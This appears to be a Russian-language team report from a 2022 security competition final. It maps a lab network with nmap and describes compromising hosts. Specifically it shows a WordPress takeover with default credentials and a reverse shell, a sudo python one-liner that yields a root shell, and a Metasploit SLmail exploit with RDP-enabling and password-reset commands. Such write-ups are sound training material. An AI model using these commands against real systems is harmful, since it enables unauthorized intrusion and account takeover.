<h1 align="center">nto-2022-finals</h1> 
<h1 align="center">Отчет команды # DEFINE AIDAR ASADULLIN</h1>

1. Network Mapping

1.1. DMZ
```
Nmap scan report for 10.33.2.10
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    nginx 1.14.2
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    nginx 1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.2.11
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: CLEAN-DRUPAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.2.12
PORT     STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_8.6 (protocol 2.0)
25/tcp    open  smtp         SLmail smtpd 5.5.0.4433
79/tcp    open  finger       SLMail fingerd
106/tcp   open  pop3pw       SLMail pop3pw
110/tcp   open  pop3         BVRP Software SLMAIL pop3d
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: a33-slmail; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.2.53
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
53/tcp open  domain  ISC BIND
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
1.2. SERVERS
```
Nmap scan report for 10.33.3.10
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-10 06:05:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: NS2; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.3.20
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          Microsoft Exchange smtpd
80/tcp   open  http          Microsoft IIS httpd 10.0
81/tc    open  http          Microsoft IIS httpd 10.0
110/tcp  open  pop3          Microsoft Exchange 2007-2010 pop3d
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          Microsoft Exchange 2007-2010 imapd
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
444/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
465/tcp  open  smtp          Microsoft Exchange smtpd
587/tcp  open  smtp          Microsoft Exchange smtpd
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
808/tcp  open  ccproxy-http?
993/tcp  open  ssl/imap      Microsoft Exchange 2007-2010 imapd
995/tcp  open  ssl/pop3      Microsoft Exchange 2007-2010 pop3d
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc
         open  msrpc         Microsoft Windows RPC
2525/tcp open  smtp          Microsoft Exchange smtpd
3389/tcp open  ms-wbt-server Microsoft Terminal Services
3800/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3801/tcp open  mc-nmf        .NET Message Framing
3828/tcp open  mc-nmf        .NET Message Framing
6001/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
6547/tcp open  msrpc         Microsoft Windows RPC
6565/tcp open  msrpc         Microsoft Windows RPC 
6566/tcp open  msrpc         Microsoft Windows RPC
7920/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mx1.company.local; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.3.50
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-10 06:05:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? 
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: NS1; OS: Windows; CPE: cpe:/o:microsoft:windows
```
1.3. OFFICE
```
Nmap scan report for 10.33.4.6
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.4.8
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: BUCHGARM; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.4.10
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.4.13
PORT     STATE SERVICE       VERSION 
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? 
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
1.4. АСУ ТП
```
Nmap scan report for 10.33.239.5
PORT      STATE SERVICE        VERSION
22/tcp    open  ssh            OpenSSH for_Windows_8.6 (protocol 2.0)
80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
1433/tcp  open  ms-sql-s       Microsoft SQL Server 2012 11.00.7001
3389/tcp  open  ms-wbt-server?
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: OIK-SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.239.6
PORT      STATE SERVICE        VERSION
22/tcp    open  ssh            OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
3389/tcp  open  ms-wbt-server?
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49175/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: OIK-CLIENT; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.240.5
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.240.6
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.240.9
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.240.10
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.240.14
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: A33-ENTEK; OS: Windows; CPE: cpe:/o:microsoft:windows
```
2. Сервисы

Web server 10.33.240.5:80 - smart EPS (сайт связан с электроэнергетикой)

Web server 10.33.2.10:80 – Word Press, на том же IP есть база данных mysql и сайт, возвращающий ошибку 500

Web server 10.33.2.11:80 – Atrium (другое название - CyberPolygon)

SLmail 10.33.2.12

LDAP 10.33.3.10

2.1. WordPress

Найдена вкладка для отправки комментариев, были безуспешные попытки ввести инъекцию XSS.
Найдена страница входа в систему метрики http://10.33.2.10/wp-login.php, данные для входа `admin:admin`, электронная почта `cybermir@cybermir.ru`
При переходе на вкладку WP File Manager обнаружен файл *wp-config.php*, где находятся данные от базы mysql: 
```
define( 'DB_NAME', 'wpdb' );

define( 'DB_USER', 'wpuser' );

define( 'DB_PASSWORD', 'mypassword' );
```
Благодаря данным администратора с помощью arbitrary file upload (в Theme editor) мы пробросили reverse shell и получили remote code execution, 
с помощью нее найдена папка *cadm*, в которой находится веб-приложение на flask (*SolarApp_back*) с простойsql-инъекцией.
Скорее всего, именно ее использовал злоумышленник.

Используя Linux Smart Enumeration (https://github.com/diego-treitos/linux-smart-enumeration), было обнаружено, что python может быть запущен с помощью sudo без ввода пароля (вероятно, это было сделано для того, чтобы запускался ранее найденный flask-сервер). С помощью команды ниже мы получили root-доступ (убедились, введя команду id): 
```sudo python 2>&1 -c "from os import system; system('/bin/sh -i 2>&1')"```

2.2. SLmail

С помощью Metasploit (https://www.rapid7.com/db/modules/exploit/windows/pop3/seattlelab_pass/) получен доступ к консоли Windows пользователя, там найдены папки SLmail, SLadmin (в папке Program File (x86)).
С помощью команды ```net user``` был обнаружен пользователь cadm. Изменив пароль у этого пользователя, мы смогли подключиться по RDP. Основные цели -  восстановить сервер Slmail и восстановить пароль на сервисе CyberPolygon. 

Порядок команд для изменения пароля:
```
chcp 65001

use post/windows/manage/enable_rdp

set USERNAME aaaa

set PASSWORD trew

set SESSION session_id

run

Get-Content

sessions -c "chcp 65001" -i index

net user cadm pass
```

2.3. SIED 

С помощью социальной инженерии удалось найти руководство по эксплуатации данной разработки (http://www.smarteps.ru/). 


2.4. 10.33.240.14 (Eternal Blue)

Использовав эксплойт мы выяснили, что на данном сервисе есть уязвимость Eternal Blue. 